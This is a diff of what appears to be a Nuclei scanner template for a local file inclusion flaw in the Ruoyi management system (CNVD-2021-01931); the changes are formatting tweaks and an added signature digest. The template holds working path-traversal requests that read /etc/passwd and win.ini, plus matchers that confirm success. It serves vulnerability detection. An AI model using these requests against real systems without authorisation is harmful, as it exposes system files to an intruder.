@@ -1,5 +1,4 @@
 id: CNVD-2021-01931
-
 info:
   name: Ruoyi Management System - Local File Inclusion
   author: daffainfo,ritikchaddha
@@ -13,21 +12,18 @@ info:
     cwe-id: CWE-22
   metadata:
     max-request: 2
-  tags: cnvd,cnvd2021,ruoyi,lfi,vuln
-
+  tags: cnvd,cnvd2021,lfi,ruoyi,vuln
 http:
   - method: GET
     path:
       - "{{BaseURL}}/common/download/resource?resource=/profile/../../../../etc/passwd"
       - "{{BaseURL}}/common/download/resource?resource=/profile/../../../../Windows/win.ini"
-
     matchers-condition: or
     matchers:
       - type: regex
         part: body
         regex:
           - "root:.*:0:0"
-
       - type: word
         part: body
         words:
@@ -35,4 +31,4 @@ http:
           - "fonts"
           - "extensions"
         condition: and
-
+        # digest: 4b0a00483046022100cd5cecd76cb20bcce4a965b3e4b9a3606c8d0f7f7d14ecc8e61ba2c19a74d631022100e18d3b8ca628844b1dd35c60ed3b74bb2b330a5bf7d0e58a1d17e269398c4061:922c64590222798bb761d5b6d8e72950
